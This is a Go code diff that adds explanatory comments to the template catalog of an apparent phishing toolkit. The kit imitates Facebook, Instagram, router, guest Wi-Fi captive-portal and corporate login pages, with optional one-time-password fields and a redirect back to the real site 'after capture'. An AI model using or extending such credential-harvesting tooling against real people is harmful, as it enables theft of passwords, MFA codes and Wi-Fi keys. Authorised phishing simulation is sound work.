@@ -30,19 +30,27 @@ type Template struct {
 
 // Fields configures how a template renders.
 type Fields struct {
-	Title         string
-	Brand         string
+	// Title is the page/browser tab title.
+	Title string
+	// Brand is the brand name shown on the page.
+	Brand string
+	// UsernameLabel is the label above the username input.
 	UsernameLabel string
+	// PasswordLabel is the label above the password input.
 	PasswordLabel string
-	ShowOTP       bool
-	OTPLabel      string
-	ButtonText    string
-	Action        string // form action URL
-	Orig          string // original login URL to redirect back to after capture
-	Subtitle      string
+	// ShowOTP toggles the optional one-time-password field.
+	ShowOTP bool
+	// OTPLabel labels the OTP field when ShowOTP is true.
+	OTPLabel string
+	// ButtonText is the submit button caption.
+	ButtonText string
+	Action     string // form action URL
+	Orig       string // original login URL to redirect back to after capture
+	Subtitle   string
 }
 
-// catalog lists the bundled templates.
+// catalog lists the bundled templates, keyed by the id used in URLs and in
+// the REPL's "phish.<id>" module names.
 var catalog = map[string]Template{
 	"facebook":      {ID: "facebook", Title: "Facebook", Description: "Facebook login page"},
 	"instagram":     {ID: "instagram", Title: "Instagram", Description: "Instagram login page"},
@@ -56,6 +64,9 @@ var catalog = map[string]Template{
 // parsed holds the compiled templates, keyed by ID.
 var parsed = mustParse()
 
+// mustParse loads and compiles every embedded template at init time. A
+// missing or syntactically broken template panics at startup: shipping a
+// broken page is a build defect, not a runtime condition.
 func mustParse() map[string]*template.Template {
 	out := map[string]*template.Template{}
 	for id := range catalog {
@@ -74,6 +85,8 @@ func mustParse() map[string]*template.Template {
 
 // ListTemplates returns the catalog sorted by ID.
 func ListTemplates() []Template {
+	// Sorting by id keeps the REPL listing and reports deterministic
+	// regardless of map iteration order.
 	ids := make([]string, 0, len(catalog))
 	for id := range catalog {
 		ids = append(ids, id)
@@ -95,6 +108,8 @@ func GetTemplate(id string) (Template, bool) {
 // DefaultFields returns the standard field set for a template, with an empty
 // Action/Orig to be filled by the caller.
 func DefaultFields(id string) Fields {
+	// Each template gets realistic defaults; templates that feature OTP/MFA
+	// collection enable that field here so the page renders with it.
 	switch id {
 	case "facebook":
 		return Fields{Title: "Facebook", Subtitle: "Log in to Facebook", ButtonText: "Log In"}
@@ -107,8 +122,12 @@ func DefaultFields(id string) Fields {
 	case "router":
 		return Fields{Title: "Router Administration", Subtitle: "Enter your administrator credentials", ButtonText: "Login", UsernameLabel: "Username", PasswordLabel: "Password"}
 	case "captiveportal":
+		// Captive portals collect a network password, so no username field
+		// is rendered; the password doubles as the Wi-Fi passphrase.
 		return Fields{Title: "Guest Network", Subtitle: "This Wi-Fi network is protected. Enter the password to connect.", ButtonText: "Connect", PasswordLabel: "Password"}
 	default:
+		// Unknown ids degrade to the generic enterprise portal instead of
+		// erroring, so the engine can always render something.
 		return Fields{Title: "Enterprise Portal", Subtitle: "Sign in with your corporate account", ButtonText: "Sign In", UsernameLabel: "Username", PasswordLabel: "Password"}
 	}
 }
@@ -135,6 +154,8 @@ func IsKnownTemplate(id string) bool {
 // NormalizeTemplateID lower-cases and strips path elements from a template id.
 func NormalizeTemplateID(id string) string {
 	id = strings.ToLower(strings.TrimSpace(id))
+	// Keep only the segment after the last '/' so URLs like
+	// "/phish/facebook" and even "/phish/a/b/facebook" resolve to "facebook".
 	if i := strings.LastIndex(id, "/"); i >= 0 {
 		id = id[i+1:]
 	}
